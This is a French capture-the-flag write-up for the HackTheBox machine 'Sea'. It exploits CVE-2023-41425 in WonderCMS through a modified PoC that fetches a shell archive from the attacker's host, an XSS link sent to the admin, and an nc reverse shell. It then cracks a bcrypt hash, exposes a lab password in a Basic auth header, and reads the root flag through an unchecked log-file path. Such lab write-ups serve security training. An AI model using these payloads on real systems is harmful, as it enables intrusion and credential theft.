# ROOM : Sea

# Infos
Une rool soit disant **easy** mais sur HackTheBox on se méfie toujours du niveau indiqué !!!

# Enumeration
On regardant un peu le site, on y retrouve un formulaire de contact, et c'est tout !

## NMAP
NMAP N'A JAMAIS FONCTIONNER SUR CETTE MACHINE! 
J'ai donc utiliser **autorecon**
```
[*] [sea.htb/all-tcp-ports] Discovered open port tcp/22 on sea.htb
[*] [sea.htb/all-tcp-ports] Discovered open port tcp/80 on sea.htb
```
## Gobuster
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/0                    (Status: 200) [Size: 3650]
/themes               (Status: 301) [Size: 230] [--> http://sea.htb/themes/]
/data                 (Status: 301) [Size: 228] [--> http://sea.htb/data/]
/plugins              (Status: 301) [Size: 231] [--> http://sea.htb/plugins/]
/messages             (Status: 301) [Size: 232] [--> http://sea.htb/messages/]
/404                  (Status: 200) [Size: 3341]
```
Ici on vois plusieurs pages qui sont avec le status 301 (Forbidden) on va essayer de voir si on peux voir quelque chose avec...
### /data
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/files                (Status: 301) [Size: 234] [--> http://sea.htb/data/files/]
/404                  (Status: 200) [Size: 3341]
```
Rien de plus, mais je vois que **sea.htb/data/home** est accessible, cela rejoint la page **sea.htb/home**.
### /themes
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/404                  (Status: 200) [Size: 3341]
/%20                  (Status: 403) [Size: 199]
/bike                 (Status: 301) [Size: 235] [--> http://sea.htb/themes/bike/]
```
Ha, une page **/bike** ! On va continuer dans ce sens
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/img                  (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/img/]
/version              (Status: 200) [Size: 6]
/css                  (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/css/]
/summary              (Status: 200) [Size: 66]
/404                  (Status: 200) [Size: 3341]
/LICENSE              (Status: 200) [Size: 1067]
```
Ok ca parle un peu plus par ici !
La page **/version** affiche juste la version, soit 3.2.0.
La page **/summary** indique que c'est un thème animer :) -> **Animated bike theme, providing more interaction to your visitors.**
La page **/license** est la licence, mais il parle de **turboblack**, je ne sais pas ce que c'est.

Une recherche sur google avec le terme **turboblack** me trouve un github qui parle de **HamsterCMS** mais rien de bien probant. Je ne trouve pas d'exploit sur ce CMS ni beaucoup d'information d'ailleurs...

On continue, avec une autre wordlist voici le résultat:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/README.md            (Status: 200) [Size: 318]
/sym/root/home/       (Status: 200) [Size: 3650]
/version              (Status: 200) [Size: 6]
```
Le README doit contenir des infos utiles !
```
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

Effectivement, on connais désormais le CMS installé : WonderCMS en version 3.2.0.
Il existe une CVE le concernant, la CVE-2023-41425.

# Exploitation
On récupère le POC via **searchsploit** puis on test.

On va devoir modifier le script car, par exemple, les machine HTB n'arrive pas a télécharger sur github. Je doit donc modifier le script pour qui télécharge l'archive contenant mon shell chez moi. 
On va donc modifier la ligne suivante :
```
var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
```
Comme ceci:
```
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.16.8:8000/shell.zip&directoryName=violet&type=themes&token=" + token;
```
Une fois toute les modifications faites, on va pouvoir retest
```
──(kali㉿kali)-[~/Challenge/HackTheBox/Sea]
└─$ python3 test.py http://sea.htb/loginURL 10.10.16.8 4444
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 4444
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.8:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [26/Aug/2024 06:25:23] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [26/Aug/2024 06:25:33] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [26/Aug/2024 06:25:33] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [26/Aug/2024 06:25:33] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [26/Aug/2024 06:25:34] "GET /shell.zip HTTP/1.1" 200 -

```
On met l'url qu'il nous fourni dans le champ **website** du formulaire de contacte afin de phish l'admin et nous voici avec un shell (enfin !!! Cela ma pris 2H !)
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                           
listening on [any] 4444 ...

connect to [10.10.16.8] from (UNKNOWN) [10.10.11.28] 59104
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 10:25:33 up 19 min,  1 user,  load average: 0.99, 0.93, 0.63
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
# Post-Exploitation
Dans le dossier **/var/www/sea/data** on retrouve un fichier **database.js** qui contient un hash:

```
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6............4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/08\/26 11:05:27": "127.0.0.1",
            "2024\/08\/26 11:01:56": "127.0.0.1",
            "2024\/08\/26 11:00:26": "127.0.0.1",
            "2024\/08\/26 10:57:56": "127.0.0.1",
            "2024\/08\/26 10:57:26": "127.0.0.1"
        },

```
On le modifie pour retirer les caractères d'échapement puis on le crack avec John :

```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/Sea]
└─$ john --wordlist=/home/kali/Wordlist/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myche****** (?)     
1g 0:00:00:20 DONE (2024-08-26 07:32) 0.04909g/s 150.2p/s 150.2c/s 150.2C/s iamcool..memories
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Mdp : myche******

Ca doit être le mdp d'un de ces 2 users :
```
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash
```
Il s'agit du mot de passe de **amay**

## PRIVESC
On faisant les petites recherches d'usage, je trouve des ports suspect :
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:32855         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```
Je vais les rerouter vers ma machine pour voir. 
Le port 32855, Il n'y a rien, je vais faire de même avec le port 8080

Ca m'ouvre une page qui me demande de m'authentifier ! Je test le compte de **amay** et cela fonctionne.
J'arrive ainsi sur une page de monitoring du système
```
System Monitor(Developing)
Disk Usage
/dev/mapper/ubuntu--vg-ubuntu--lv 6.6G 4.3G 1.9G 70% /

Used:

Total: 70%

```
Il permet aussi de voir des logs.

Le fichier **acces.log** et le fichier **auth.log**, mais je ne trouve rien d'interessant dedans.

Quand on regarde via BurpSuite la requête :
```
POST / HTTP/1.1
Host: localhost:5555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:5555
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://localhost:5555/
Cookie: JSESSIONID.978d603c=node0tygn38nbaji4vppfog6jecnp2.node0; JSESSIONID.1782143f=node01jht6buz0mpq31vy3xeih5tq7m1.node0; screenResolution=1920x969
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

On vois ici que **log_file** a un path complet, on va test de mettre **/root/root.txt**
```
</form>
            144c1a2XXXf
<p class='error'>Suspicious traffic patterns detected in /root/root.txt;id:</p><pre>144cXXXXXbf</pre>
```
et nous voici avec le flag root !
